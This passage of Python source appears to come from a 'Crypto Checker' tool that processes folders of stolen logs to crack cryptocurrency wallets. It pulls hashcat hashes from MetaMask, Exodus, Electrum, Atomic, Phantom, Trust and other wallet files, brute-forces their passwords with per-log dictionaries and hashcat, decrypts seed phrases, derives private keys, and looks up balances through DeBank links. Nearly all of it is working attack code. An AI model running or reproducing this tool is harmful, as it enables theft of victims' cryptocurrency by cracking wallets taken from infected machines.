                        raise Exception("%s: Make sure that this is a MultiBit HD wallet")
                    iv = data[:16]  # v0.5.0+
                    block_iv = data[16:32]  # v0.5.0+
                    block_noiv = data[:16]  # encrypted using hardcoded iv, < v0.5.0
                    iv = binascii.hexlify(iv).decode("ascii")
                    block_iv = binascii.hexlify(block_iv).decode("ascii")
                    block_noiv = binascii.hexlify(block_noiv).decode("ascii")
                    hash = f"$multibit${version}*{iv}*{block_iv}*{block_noiv}"
                    return hash, 22700

        except:
            return False

    def get_hash_blockchain(path_wallet):
        try:
            with open(path_wallet, "rb") as f:
                data = f.read()

            decoded_data = json.loads(data.decode("utf-8"))
            if "version" in decoded_data and (str(decoded_data["version"]) == "2" or str(decoded_data["version"]) == "3" or str(decoded_data["version"]) == "4"):
                payload = base64.b64decode(decoded_data["payload"])
                data = decoded_data["pbkdf2_iterations"]
                version = "v2"
                z = binascii.hexlify(payload).decode("ascii")
                hash = f"$blockchain${version}${data}${len(payload)}${z}"
                return hash, 15200
        except:
            pass

        try:
            data = base64.decodebytes(data)
            version = len(data)
            z = binascii.hexlify(data).decode("ascii")
            hash = f"$blockchain${version}${z}"
            return hash, 12700
        except:
            pass

        try:
            z = binascii.hexlify(data).decode("ascii")
            version = len(data)
            hash = f"$blockchain${version}${z}"
            return hash, 12700
        except:
            pass

        return False

    def get_hash_coinomi(path_wallet):
        try:
            with open(path_wallet, "rb") as f:
                data = f.read()

            pb_wallet = protobuf.coinomi_pb2.Wallet()
            pb_wallet.ParseFromString(data)
            if pb_wallet.encryption_type == protobuf.coinomi_pb2.Wallet.UNENCRYPTED:
                raise ValueError("Coinomi wallet is not encrypted")
            if pb_wallet.encryption_type != protobuf.coinomi_pb2.Wallet.ENCRYPTED_SCRYPT_AES:
                raise NotImplementedError("Unsupported Coinomi wallet encryption type " + str(pb_wallet.encryption_type))
            if not pb_wallet.HasField("encryption_parameters"):
                raise ValueError("Coinomi wallet is missing its scrypt encryption parameters")
            encrypted_masterkey_part = pb_wallet.master_key.encrypted_data.encrypted_private_key[-32:]
            salt = pb_wallet.encryption_parameters.salt
            n = pb_wallet.encryption_parameters.n
            r = pb_wallet.encryption_parameters.r
            p = pb_wallet.encryption_parameters.p
            encrypted_data = binascii.hexlify(encrypted_masterkey_part).decode("ascii")
            salt = binascii.hexlify(salt).decode("ascii")
            hash = f"$multibit$3*{n}*{r}*{p}*{salt}*{encrypted_data}"
            return hash
        except:
            pass

        return False

    # 15700
    def get_hash_keystroke(path_wallet):
        try:
            with open(path_wallet, "rb") as f:
                data = f.read().decode("utf-8")
            data = json.loads(data)

            try:
                crypto = data["crypto"]
            except KeyError:
                try:
                    crypto = data["Crypto"]
                except:
                    try:
                        bkp = data["bkp"]
                    except KeyError:
                        raise Exception("Presale wallet is missing 'bkp' field, this is unsupported!")

                    try:
                        encseed = data["encseed"]
                        ethaddr = data["ethaddr"]
                    except KeyError:
                        raise Exception("Presale wallet is missing necessary fields!")

                    # 16 bytes of bkp should be enough
                    hash = f"$ethereum$w*{encseed}*{ethaddr}*{bkp[:32]}"
                    return hash

            cipher = crypto["cipher"]

            if cipher != "aes-128-ctr":
                raise Exception(f"Unexpected cipher '{cipher}' found")

            kdf = crypto["kdf"]
            ciphertext = crypto["ciphertext"]
            mac = crypto["mac"]

            if kdf == "scrypt":
                kdfparams = crypto["kdfparams"]
                n = kdfparams["n"]
                r = kdfparams["r"]
                p = kdfparams["p"]
                salt = kdfparams["salt"]
                hash = f"$ethereum$s*{n}*{r}*{p}*{salt}*{ciphertext}*{mac}"
                return hash
            elif kdf == "pbkdf2":
                kdfparams = crypto["kdfparams"]
                n = kdfparams["c"]
                prf = kdfparams["prf"]
                if prf != "hmac-sha256":
                    raise Exception(f"Unexpected prf '{prf}' found")
                salt = kdfparams["salt"]
                hash = f"$ethereum$p*{n}*{salt}*{ciphertext}*{mac}"
                return hash
        except:
            pass

        return False

    def get_hash_atomic(path_wallet):
        try:
            leveldb_records = ccl_leveldb.RawLevelDb(path_wallet)
            for record in leveldb_records.iterate_records_raw():
                if b"_file://\x00\x01general_mnemonic" in record.key:
                    data = record.value[1:]
                    data = base64.b64decode(data)
                    salt = data[8:16].hex()
                    ciphertext = data[16:].hex()
                    hash = f"$atomic${salt}${ciphertext}"
                    return hash
        except:
            return False

    def get_hash_trust(path_wallet):
        try:
            leveldb_records = ccl_leveldb.RawLevelDb(path_wallet)
            for record in leveldb_records.iterate_records_raw():
                if b"trust:vault" in record.key:
                    wallet_data = record.value.decode("utf8").replace('\\"', '"')[1:-1]
                    wallet_json = json.loads(wallet_data)
                    ciphertext_b64 = wallet_json["data"]
                    nonce_b64 = wallet_json["iv"]
                    salt_b64 = wallet_json["salt"]
                    break

            for record in leveldb_records.iterate_records_raw():
                if b"trust:pbkdf2" in record.key:
                    pbkdf2_data = record.value.decode("utf8").replace('\\"', '"')[1:-1]
                    salt2 = json.loads(pbkdf2_data)["salt"][2:]
                    mybytes = []
                    for i in range(len(salt2) // 2):
                        res = int(salt2[2 * i : 2 * i + 2], 16)
                        mybytes.append(res)
                    salt2_b64 = base64.b64encode(bytes(mybytes)).decode()
                    break
            hash = f"$trustext${salt_b64}${salt2_b64}${nonce_b64}${ciphertext_b64}"
            return hash
        except:
            return False

    def get_hash_phantom(path_wallet):
        BITCOIN_ALPHABET = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
        b58asb64 = lambda x: base64.b64encode(b58decode(x)).decode()

        def dump(dbdir, repair=False):
            if isinstance(dbdir, str):
                dbdir = Path(dbdir)
            if not dbdir.exists():
                raise RuntimeError(f'dbdir "{dbdir}" doesnt exist\n')

            db = plyvel.DB(str(dbdir))
            # Repair db in dbdir, eg:
            # Corruption: corrupted compressed block contents
            if repair:
                # print("Repairing db...\n")
                plyvel.repair_db(str(dbdir))

            res = {}
            for k, v in db:
                # print(f'{k.decode()}: {v}')
                # print(f'{k.decode()}')
                res[k.decode()] = v
            db.close()
            return res

        def scrub_input(v) -> bytes:
            if isinstance(v, str):
                v = v.encode("ascii")
            return v

        @lru_cache()
        def _get_base58_decode_map(alphabet: bytes, autofix: bool):
            invmap = {char: index for index, char in enumerate(alphabet)}

            if autofix:
                groups = [b"0Oo", b"Il1"]
                for group in groups:
                    pivots = [c for c in group if c in invmap]
                    if len(pivots) == 1:
                        for alternative in group:
                            invmap[alternative] = invmap[pivots[0]]

            return invmap

        def b58decode_int(v, alphabet: bytes = BITCOIN_ALPHABET, *, autofix: bool = False) -> int:
            if b" " not in alphabet:
                v = v.rstrip()
            v = scrub_input(v)

            map = _get_base58_decode_map(alphabet, autofix=autofix)

            decimal = 0
            base = len(alphabet)
            try:
                for char in v:
                    decimal = decimal * base + map[char]
            except KeyError as e:
                raise ValueError("Invalid character {!r}".format(chr(e.args[0]))) from None
            return decimal

        def b58decode(v, alphabet: bytes = BITCOIN_ALPHABET, *, autofix: bool = False) -> bytes:
            v = v.rstrip()
            v = scrub_input(v)

            origlen = len(v)
            v = v.lstrip(alphabet[0:1])
            newlen = len(v)

            if b" " not in alphabet:
                v = v.rstrip()
            v = scrub_input(v)

            map = _get_base58_decode_map(alphabet, autofix=autofix)

            decimal = 0
            base = len(alphabet)
            try:
                for char in v:
                    decimal = decimal * base + map[char]
            except KeyError as e:
                raise ValueError("Invalid character {!r}".format(chr(e.args[0]))) from None

            return decimal.to_bytes(origlen - newlen + (decimal.bit_length() + 7) // 8, "big")

        try:
            res = dump(path_wallet)
            try:
                mnemonic = json.loads(res["encryptedSeedAndMnemonic"])["value"]
            except:
                try:
                    mnemonic = json.loads(res["encryptedMnemonic"])["value"]
                except:
                    try:
                        mnemonic = json.loads(res[".phantom-labs.encryption.encryptionKey"])["encryptedKey"]
                    except:
                        return False

            data = json.loads(mnemonic)
            encrypted = data["encrypted"].encode()
            nonce = data["nonce"].encode()
            salt = data["salt"].encode()
            hash = f"$phantom${b58asb64(salt)}${b58asb64(nonce)}${b58asb64(encrypted)}"
            return hash
        except:
            return False

    hash = False
    hash_mode = False

    if wallet == "metamask":
        hash = get_hash_metamask(path_source)
    elif wallet == "exodus":
        hash = get_hash_exodus(path_source)
    elif wallet == "core":
        hash = get_hash_core(path_source)
    elif wallet == "electrum":
        hash, hash_mode = get_hash_electrum(path_source)
    elif wallet == "multibit":
        hash, hash_mode = get_hash_multibit(path_source)
    elif wallet == "blockchain":
        hash, hash_mode = get_hash_blockchain(path_source)
    elif wallet == "coinomi":
        hash = get_hash_coinomi(path_source)
    elif wallet == "keystroke":
        hash = get_hash_keystroke(path_source)
    elif wallet == "atomic":
        hash = get_hash_atomic(path_source)
    elif wallet == "trust":
        hash = get_hash_trust(path_source)
    elif wallet == "atomic":
        hash = get_hash_atomic(path_source)
    elif wallet == "phantom":
        hash = get_hash_phantom(path_source)

    return hash, hash_mode


def get_hash_ldb(path_wallet):
    try:
        leveldb_records = ccl_leveldb.RawLevelDb(path_wallet)
        walletdata_list = []
        for record in leveldb_records.iterate_records_raw():
            if b"vault" in record.key or b"encryptedVault" in record.key:
                data = record.value.decode("utf-8", "ignore").replace("\\", "")
                if "salt" in data:
                    if data in walletdata_list:
                        continue
                    wallet_data = data[1:-1]

            if b"data" in record.key:
                data = record.value.decode("utf-8", "ignore").replace("\\", "")
                if "salt" in data:
                    walletStartText = "vault"
                    wallet_data_start = data.lower().find(walletStartText)
                    wallet_data_trimmed = data[wallet_data_start:]
                    wallet_data_start = wallet_data_trimmed.find("data")
                    wallet_data_trimmed = wallet_data_trimmed[wallet_data_start - 2 :]
                    wallet_data_end = wallet_data_trimmed.find("}")
                    wallet_data = wallet_data_trimmed[: wallet_data_end + 1]
        try:
            wallet_json = json.loads(wallet_data)
        except json.decoder.JSONDecodeError:
            walletStartText = "vault"
            wallet_data_start = wallet_data.lower().find(walletStartText)
            wallet_data_trimmed = wallet_data[wallet_data_start:]
            wallet_data_start = wallet_data_trimmed.find("cipher")
            wallet_data_trimmed = wallet_data_trimmed[wallet_data_start - 2 :]
            wallet_data_end = wallet_data_trimmed.find("}")
            wallet_data = wallet_data_trimmed[: wallet_data_end + 1]
            wallet_json = json.loads(wallet_data)

        hash = "$metamask$" + wallet_json["salt"] + "$" + wallet_json["iv"] + "$" + wallet_json["data"]
    except:
        hash = False
        wallet_json = False

    return hash, wallet_json


def get_encrypted_data(path_source):
    with open(path_source, "r", encoding="utf-8", errors="ignore") as f:
        file = f.read()
    regex = [
        r"{\\\"data\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"salt\\\":\\\"(.+?)\\\"}",
        r"{\\\"encrypted\\\":\\\"(.+?)\\\",\\\"nonce\\\":\\\"(.+?)\\\",\\\"kdf\\\":\\\"pbkdf2\\\",\\\"salt\\\":\\\"(.+?)\\\",\\\"iterations\\\":10000,\\\"digest\\\":\\\"sha256\\\"}",
        r"{\\\"ct\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"s\\\":\\\"(.+?)\\\"}",
    ]
    for r in regex:
        matches = re.search(r, file, re.MULTILINE)
        if matches:
            data = matches.group(1)
            iv = matches.group(2)
            salt = matches.group(3)
            vault = {"data": data, "iv": iv, "salt": salt}
            return {"status": True, "data": vault}
    return {"status": False, "data": []}


# ! HARDWARE WALLETS ------------------------------------------------------------------
def check_hardware(path_wallet):
    with open(path_wallet, "r", encoding="utf8", errors="surrogateescape") as f:
        lines = f.readlines()
        for line in lines:
            if '"name":"Ledger' in line:
                return "Ledger"

            if '"name":"Trezor' in line:
                return "Trezor"


def process_hardware(path_wallet, path_results, lock):
    hardware = check_hardware(path_wallet)
    if hardware:
        wallet_type = get_wallet_type(path_wallet)

        output = "+--------------------+--------------------------------------------------------------------+\n"
        output += f"| Hardware...........| {utils.bcolors.RED}{hardware}{utils.bcolors.END}\n"
        output += f"| Path...............| {path_wallet}\n"
        output += f"| Wallet.............| {wallet_type}\n"

        log_addresses = get_addresses_browser(path_wallet)
        debank_links = []
        if len(log_addresses) > 0:
            for i in range(len(log_addresses)):
                log_address = log_addresses[i]
                debank_link = f"https://debank.com/profile/{log_address}"
                debank_links.append(debank_link)
                output += f"| Log Address {i+1}......| {log_address}\n"
                output += f"| DeBank {i+1}...........| {debank_link}\n"
        else:
            log_addresses = "-"

        hash, hash_mode = get_hash("metamask", path_wallet)

        debank_links = "\n".join(debank_links)
        if log_addresses != "-":
            log_addresses = "\n".join(log_addresses)

        lock.acquire()
        utils.write_to_excel([path_wallet, hardware, "-", "-", "-", wallet_type, hash, "26600", "-", log_addresses, debank_links], path_results)
        print(output)
        lock.release()

        return path_wallet


# ! OTHER ------------------------------------------------------------------
def get_path_log(path_wallet):
    path_log = False
    if "Wallets" in path_wallet:
        path_log = path_wallet.split("Wallets")[0]
    elif "wallets" in path_wallet:
        path_log = path_wallet.split("wallets")[0]
    elif "Coins" in path_wallet:
        path_log = path_wallet.split("Coins")[0]

    return path_log


def process_bads(path_wallet, path_results, lock):
    hash, hash_mode = get_hash("metamask", path_wallet)
    if not hash:
        hash = "-"

    wallet_type = get_wallet_type(path_wallet)
    output = "+--------------------+--------------------------------------------------------------------+\n"
    output += f"| Status.............| {utils.bcolors.RED}Failed{utils.bcolors.END}\n"
    output += f"| Path...............| {path_wallet}\n"
    output += f"| Wallet.............| {wallet_type}\n"

    log_addresses = get_addresses_browser(path_wallet)
    debank_links = []
    if len(log_addresses) > 0:
        for i in range(len(log_addresses)):
            log_address = log_addresses[i]
            debank_link = f"https://debank.com/profile/{log_address}"
            debank_links.append(debank_link)
            output += f"| Log Address {i+1}......| {log_address}\n"
            output += f"| DeBank {i+1}...........| {debank_link}\n"
    else:
        log_addresses = "-"

    hardware = check_hardware(path_wallet)
    if hardware:
        output += f"| Hardware...........| {utils.bcolors.RED}{hardware}{utils.bcolors.END}\n"
    else:
        hardware = "No"

    debank_links = "\n".join(debank_links)
    if log_addresses != "-":
        log_addresses = "\n".join(log_addresses)

    lock.acquire()
    utils.write_to_excel([path_wallet, hardware, "-", "-", "-", wallet_type, hash, "26600", "-", log_addresses, debank_links], path_results)
    print(output)
    lock.release()


# ! BRUTE ------------------------------------------------------------------
def check_web_wallet(path_wallet, depth_public_addresses, depth_private_keys, path_results, lock):
    vhash = hash_decrypt.hdec()
    path_log = get_path_log(path_wallet)
    if not path_log:
        return False

    wallet_type = get_wallet_type(path_wallet)

    path_dict = os.path.join(path_log, "cc_paswords.txt")
    if not os.path.isfile(path_dict):
        create_dict(path_log)

    if os.path.isfile(path_dict):
        hash = "-"
        password = "-"
        mnemonic = "-"

        try:
            payload = get_encrypted_data(path_wallet)["data"]
            hash = "$metamask$" + payload["salt"] + "$" + payload["iv"] + "$" + payload["data"]
            with open(path_dict, "r", encoding="utf8", errors="ignore") as f:
                passwords = [line.strip() for line in f]
                for password in passwords:
                    obj = vhash.decrypt(password, str(payload).replace("'", '"'))
                    if obj["status"]:
                        mnemonic = process_mnemonic(obj["result"])["data"]
                        mnemonic_len = len(str(mnemonic).split())
                        if mnemonic_len != 12 and mnemonic_len != 24:
                            mnemonic = "-"
                        break
                    else:
                        password = "-"
                        mnemonic = "-"
        except:
            pass

        if password != "-":
            # results main
            output = "+--------------------+--------------------------------------------------------------------+\n"
            output += f"| Status.............| {utils.bcolors.GREEN}Cracked{utils.bcolors.END}\n"
            output += f"| Path...............| {path_wallet}\n"
            output += f"| Wallet.............| {wallet_type}\n"
            output += f"| Seed...............| {mnemonic}\n"
            output += f"| Password...........| {password}\n"

            # results ledger/trezor
            hardware = check_hardware(path_wallet)
            if hardware:
                output += f"| Hardware...........| {utils.bcolors.RED}{hardware}{utils.bcolors.END}\n"
            else:
                hardware = "No"

            # results debank links
            debank_links = []

            # resulst mnemonics addresses
            if mnemonic != "-":
                private_keys = get_private_keys(mnemonic, depth_private_keys)
                if len(private_keys) > 0:
                    for i in range(len(private_keys)):
                        private_key = private_keys[i]
                        output += f"| Private Key {i+1}......| {private_key}\n"

                seed_addresses = get_public_addresses(mnemonic, depth_public_addresses)
                if len(seed_addresses) > 0:
                    for i in range(len(seed_addresses)):
                        seed_address = seed_addresses[i]
                        debank_link = f"https://debank.com/profile/{seed_address}"
                        debank_links.append(debank_link)
                        output += f"| Seed Address {i+1}.....| {seed_address}\n"
                        output += f"| DeBank {i+1}...........| {debank_link}\n"
            else:
                private_keys = "-"
                seed_addresses = "-"

            # results log addresses
            log_addresses = get_addresses_browser(path_wallet)
            if len(log_addresses) > 0:
                for i in range(len(log_addresses)):
                    log_address = log_addresses[i]
                    debank_link = f"https://debank.com/profile/{log_address}"
                    debank_links.append(debank_link)
                    output += f"| Log Address {i+1}......| {log_address}\n"
                    output += f"| DeBank {i+1}...........| {debank_link}\n"
            else:
                log_addresses = "-"

            # results excel
            debank_links = "\n".join(debank_links)
            if log_addresses != "-":
                log_addresses = "\n".join(log_addresses)
            if private_keys != "-":
                private_keys = "\n".join(private_keys)
            if seed_addresses != "-":
                seed_addresses = "\n".join(seed_addresses)

            lock.acquire()
            utils.write_to_excel([path_wallet, hardware, password, mnemonic, private_keys, wallet_type, hash, "26600", seed_addresses, log_addresses, debank_links], path_results)
            with open(utils.get_file_path(f"results/web_wallets.txt"), 'a', encoding='utf8') as f:
                f.write(output + "\n")
            print(output)
            lock.release()

            return path_wallet


def hashcat(hash_type, hash, path_dict, path_mask, path_rules):
    try:
        path_hc = utils.get_file_path("hashcat")
        path_hc_exe = utils.get_file_path("hashcat/hashcat.exe")
        path_hc_results = utils.get_file_path("hashcat_results.txt")

        system_type = platform.system()
        if system_type == "Windows":
            os.chdir(path_hc)

        if os.path.exists(path_hc_results):
            os.remove(path_hc_results)

        if path_dict:
            attack_mode = 0
            final_dict = path_dict
        elif path_mask:
            attack_mode = 3
            final_dict = path_mask

        if system_type == "Windows":
            launch_options = [path_hc_exe]
        else:
            launch_options = ["hashcat"]

        launch_options.extend(["-S", "--potfile-disable", "-w4", f"-m{hash_type}", f"-a{attack_mode}", f"-o{path_hc_results}", f"{hash}", f"{final_dict}"])

        if path_rules:
            launch_options.extend([f"-r{path_rules}"])

        if hash_type == 30010 or hash_type == 30020:
            launch_options.extend(["-O"])
        elif hash_type == 26620:
            launch_options.extend(["--backend-ignore-cuda", "--self-test-disable", "-u1", "--force"])

        subprocess.run(launch_options)

        if os.path.exists(path_hc_results):
            with open(utils.get_file_path(path_hc_results), "r", encoding="utf8") as f:
                last_line = f.readlines()[-1].rstrip()
                password = last_line.split(":")[-1]
            os.remove(path_hc_results)
        else:
            password = "-"

        return password
    except:
        pass


def checker(
    path_source,
    path_results,
    path_errors,
    cores,
    rules_path,
    depth_public_addresses,
    depth_private_keys,
    is_parse_mnemonics,
    is_browser_wallets,
    is_browser_wallets_ldb,
    is_skip_ledger,
    is_skip_trezor,
    is_bads,
    is_atomic,
    is_phantom,
    is_trust,
    is_core_wallets,
    is_exodus,
    is_electrum,
    is_multibit,
    is_blockchain,
    is_coinomi,
    is_keystroke,
):
    #! parse --------------------------------------------------------------------------------
    if is_parse_mnemonics:
        utils.set_title("Crypto Checker [Status: Parsing Mnemonics]")
        path_files = set()

        for root, dirs, files in os.walk(path_source):
            for filename in files:
                path_full = os.path.join(root, filename)
                if path_full.endswith(".txt") or path_full.endswith(".docx") or path_full.endswith(".html"):
                    path_files.add(path_full)

        if len(path_files) > 0:
            with multiprocessing.Manager() as m:
                lock = m.Lock()
                with multiprocessing.Pool(cores) as p:
                    p.starmap(parse_mnemonic, zip(path_files, repeat(depth_public_addresses), repeat(depth_private_keys), repeat(path_results), repeat(lock)))

    if is_browser_wallets:
        utils.set_title("Crypto Checker [Status: Getting Browser Wallets]")
        path_wallets = set()
        for root, dirs, files in os.walk(path_source):
            for filename in files:
                path_full = os.path.join(root, filename)
                path_full = path_full.replace("\\", "/")
                path_full_lower = path_full.lower()
                if path_full_lower.endswith(".log") and "atomic" not in path_full_lower and "phantom" not in path_full_lower:
                    path_wallets.add(path_full)
        path_wallets = list(path_wallets)

    #! ledger/trezor check --------------------------------------------------------------------------------
    if is_browser_wallets and (is_skip_ledger or is_skip_trezor):
        utils.set_title("Crypto Checker [Status: Checking Ledger and Trezor]")
        if len(path_wallets) > 0:
            with multiprocessing.Manager() as m:
                lock = m.Lock()
                with multiprocessing.Pool(cores) as p:
                    for result in p.starmap(process_hardware, zip(path_wallets, repeat(path_results), repeat(lock))):
                        if result:
                            path_wallets.remove(result)

    #! fast check --------------------------------------------------------------------------------
    if is_browser_wallets:
        utils.set_title("Crypto Checker [Status: Browser Wallets Check]")
        if len(path_wallets) > 0:
            with multiprocessing.Manager() as m:
                lock = m.Lock()
                with multiprocessing.Pool(cores) as p:
                    p.starmap(check_web_wallet, zip(path_wallets, repeat(depth_public_addresses), repeat(depth_private_keys), repeat(path_results), repeat(lock)))

    #! bads --------------------------------------------------------------------------------
    if is_browser_wallets and is_bads:
        utils.set_title("Crypto Checker [Status: Browser Wallets Bads]")
        if len(path_wallets) > 0:
            with multiprocessing.Manager() as m:
                lock = m.Lock()
                with multiprocessing.Pool(cores) as p:
                    p.starmap(process_bads, zip(path_wallets, repeat(path_results), repeat(lock)))

    #! hashcat check --------------------------------------------------------------------------------
    if is_browser_wallets and rules_path:
        utils.set_title("Crypto Checker [Status: Browser Wallets Check with Rules]")
        if len(path_wallets) > 0:
            for path_wallet in path_wallets:
                path_log = get_path_log(path_wallet)
                if not path_log:
                    continue

                hash, hash_mode = get_hash("metamask", path_wallet)
                if not hash:
                    continue

                path_dict = os.path.join(path_log, "cc_paswords.txt")
                create_dict(path_log)
                if not os.path.exists(path_dict):
                    continue

                password = hashcat(26600, hash, path_dict, False, rules_path)

                if password != "-":
                    path_wallets.remove(path_wallet)
                    wallet_type = get_wallet_type(path_wallet)

                    try:
                        vhash = hash_decrypt.hdec()
                        encrypted_data = get_encrypted_data(path_wallet)
                        payload = encrypted_data["data"]
                        obj = vhash.decrypt(password, str(payload).replace("'", '"'))
                        mnemonic = process_mnemonic(obj["result"])["data"]
                        mnemonic_len = len(str(mnemonic).split())
                        if mnemonic_len != 12 and mnemonic_len != 24:
                            mnemonic = "-"
                    except:
                        mnemonic = "-"

                    # results main
                    output = "+--------------------+--------------------------------------------------------------------+\n"
                    output += f"| Status.............| {utils.bcolors.GREEN}Cracked{utils.bcolors.END}\n"
                    output += f"| Path...............| {path_wallet}\n"
                    output += f"| Wallet.............| {wallet_type}\n"
                    output += f"| Seed...............| {mnemonic}\n"
                    output += f"| Password...........| {password}\n"

                    # results ledger/trezor
                    hardware = check_hardware(path_wallet)
                    if hardware:
                        output += f"| Hardware...........| {utils.bcolors.RED}{hardware}{utils.bcolors.END}\n"
                    else:
                        hardware = "No"

                    # results debank links
                    debank_links = []

                    # resulst mnemonics addresses
                    if mnemonic != "-":
                        private_keys = get_private_keys(mnemonic, depth_private_keys)
                        if len(private_keys) > 0:
                            for i in range(len(private_keys)):
                                private_key = private_keys[i]
                                output += f"| Private Key {i+1}......| {private_key}\n"

                        seed_addresses = get_public_addresses(mnemonic, depth_public_addresses)
                        if len(seed_addresses) > 0:
                            for i in range(len(seed_addresses)):
                                seed_address = seed_addresses[i]
                                debank_link = f"https://debank.com/profile/{seed_address}"
                                debank_links.append(debank_link)
                                output += f"| Seed Address {i+1}.....| {seed_address}\n"
                                output += f"| DeBank {i+1}...........| {debank_link}\n"
                    else:
                        private_keys = "-"
                        seed_addresses = "-"

                    # results log addresses
                    log_addresses = get_addresses_browser(path_wallet)
                    if len(log_addresses) > 0:
                        for i in range(len(log_addresses)):
                            log_address = log_addresses[i]
                            debank_link = f"https://debank.com/profile/{log_address}"
                            debank_links.append(debank_link)
                            output += f"| Log Address {i+1}......| {log_address}\n"
                            output += f"| DeBank {i+1}...........| {debank_link}\n"
                    else:
                        log_addresses = "-"

                    # results excel
                    debank_links = "\n".join(debank_links)
                    if log_addresses != "-":
                        log_addresses = "\n".join(log_addresses)
                    if private_keys != "-":
                        private_keys = "\n".join(private_keys)
                    if seed_addresses != "-":
                        seed_addresses = "\n".join(seed_addresses)

                    utils.write_to_excel([path_wallet, hardware, password, mnemonic, private_keys, wallet_type, hash, "26600", seed_addresses, log_addresses, debank_links], path_results)
                    with open(utils.get_file_path(f"results/web_wallets.txt"), 'a', encoding='utf8') as f:
                        f.write(output + "\n")
                    print("\n" + output)

    #! ldb wallets --------------------------------------------------------------------------------
    if is_browser_wallets_ldb:
        utils.set_title("Crypto Checker [Status: Browser Wallets LDB Check]")
        path_wallets_ldb = set()
        path_wallets = glob(os.path.join(path_source, "**/*.ldb"), recursive=True)
        for path_wallet in path_wallets:
            wallet_list = path_wallet.split("/")
            len_mm = len(wallet_list) - 1
            path_metamask = "/".join(wallet_list[:len_mm])
            path_wallets_ldb.add(path_metamask)

        path_wallets = []
        for path_wallet in path_wallets_ldb:
            is_good = True
            for root, dirs, files in os.walk(path_wallet):
                for filename in files:
                    path_full = os.path.join(root, filename)
                    path_full = path_full.replace("\\", "/")
                    path_full_lower = path_full.lower()
                    if path_full.endswith(".log") and "atomic" not in path_full_lower and "phantom" not in path_full_lower:
                        is_good = False
            if is_good:
                wallet_list = path_wallet.split("/")
                path_log = get_path_log(path_wallet)
                if not path_log:
                    continue
                path_dict = os.path.join(path_log, "cc_paswords.txt")
                create_dict(path_log)
                if os.path.isfile(path_dict):
                    path_wallets.append(path_wallet)

        for path_wallet in path_wallets:
            path_log = get_path_log(path_wallet)
            if not path_log:
                continue

            hash, wallet_json = get_hash_ldb(path_wallet)
            if not hash or not wallet_json:
                continue

            path_dict = os.path.join(path_log, "cc_paswords.txt")
            if not os.path.exists(path_dict):
                continue

            password = hashcat(26600, hash, path_dict, False, rules_path)
            wallet_type = get_wallet_type(path_wallet) + " (LDB)"

            if password != "-":
                try:
                    vhash = hash_decrypt.hdec()
                    obj = vhash.decrypt(password, str(wallet_json).replace("'", '"'))
                    mnemonic = process_mnemonic(obj["result"])["data"]
                    mnemonic_len = len(str(mnemonic).split())
                    if mnemonic_len != 12 and mnemonic_len != 24:
                        mnemonic = "-"
                except:
                    mnemonic = "-"

                # results main
                output = "+--------------------+--------------------------------------------------------------------+\n"
                output += f"| Status.............| {utils.bcolors.GREEN}Cracked{utils.bcolors.END}\n"
                output += f"| Path...............| {path_wallet}\n"
                output += f"| Wallet.............| {wallet_type}\n"
                output += f"| Seed...............| {mnemonic}\n"
                output += f"| Password...........| {password}\n"

                # results debank links
                debank_links = []

                # resulst mnemonics addresses
                if mnemonic != "-":
                    private_keys = get_private_keys(mnemonic, depth_private_keys)
                    if len(private_keys) > 0:
                        for i in range(len(private_keys)):
                            private_key = private_keys[i]
                            output += f"| Private Key {i+1}......| {private_key}\n"

                    seed_addresses = get_public_addresses(mnemonic, depth_public_addresses)
                    if len(seed_addresses) > 0:
                        for i in range(len(seed_addresses)):
                            seed_address = seed_addresses[i]
                            debank_link = f"https://debank.com/profile/{seed_address}"
                            debank_links.append(debank_link)
                            output += f"| Seed Address {i+1}.....| {seed_address}\n"
                            output += f"| DeBank {i+1}...........| {debank_link}\n"
                else:
                    private_keys = "-"
                    seed_addresses = "-"

                # results excel
                debank_links = "\n".join(debank_links)
                if private_keys != "-":
                    private_keys = "\n".join(private_keys)
                if seed_addresses != "-":
                    seed_addresses = "\n".join(seed_addresses)

                utils.write_to_excel([path_wallet, "?", password, mnemonic, private_keys, wallet_type, hash, "26600", seed_addresses, "-", debank_links], path_results)
                with open(utils.get_file_path(f"results/web_wallets.txt"), 'a', encoding='utf8') as f:
                    f.write(output + "\n")

            else:
                output = "+--------------------+--------------------------------------------------------------------+\n"
                output += f"| Status.............| {utils.bcolors.RED}Failed{utils.bcolors.END}\n"
                output += f"| Path...............| {path_wallet}\n"
                output += f"| Wallet.............| {wallet_type}\n"

                utils.write_to_excel([path_wallet, "?", "-", "-", "-", wallet_type, hash, "26600", "-", "-", "-"], path_results)

            print("\n" + output)

    #! extra wallets --------------------------------------------------------------------------------
    utils.set_title("Crypto Checker [Status: Checking Other Wallets]")
    for root, dirs, files in os.walk(path_source):
        for filename in files:
            try:
                path_wallet = os.path.join(root, filename)
                path_wallet = path_wallet.replace("\\", "/")
                path_wallet_low = path_wallet.lower()
                path_log = get_path_log(path_wallet)
                if not path_log:
                    continue

                path_dict = os.path.join(path_log, "cc_paswords.txt")

                if is_atomic and "atomic" in path_wallet_low and (path_wallet_low.endswith(".log") or path_wallet_low.endswith(".ldb")):
                    path_atomic = path_wallet.split("/")[:-1]
                    path_atomic = "/".join(path_atomic)
                    hash, hash_mode = get_hash("atomic", path_atomic)
                    if hash:
                        create_dict(path_log)
                        if os.path.exists(path_dict):
                            password = hashcat(30020, hash, path_dict, False, rules_path)
                            wallet_type = "Atomic"
                            mnemonic = "-"
                            if password and password != "-":
                                mnemonic = get_mnemonic_atomic(hash, password)

                                output = "+--------------------+--------------------------------------------------------------------+\n"
                                output += f"| Status.............| {utils.bcolors.GREEN}Cracked{utils.bcolors.END}\n"
                                output += f"| Path...............| {path_wallet}\n"
                                output += f"| Wallet.............| {wallet_type}\n"
                                output += f"| Password...........| {password}\n"
                                output += f"| Mnemonic...........| {mnemonic}\n"
                            else:
                                output = "+--------------------+--------------------------------------------------------------------+\n"
                                output += f"| Status.............| {utils.bcolors.RED}Failed{utils.bcolors.END}\n"
                                output += f"| Path...............| {path_wallet}\n"
                                output += f"| Wallet.............| {wallet_type}\n"

                            print("\n" + output)
                            utils.write_to_excel([path_wallet, "?", password, mnemonic, "-", wallet_type, hash, "30020", "-", "-", "-"], path_results)
                            with open(utils.get_file_path(f"results/atomic_wallets.txt"), 'a', encoding='utf8') as f:
                                f.write(output + "\n")

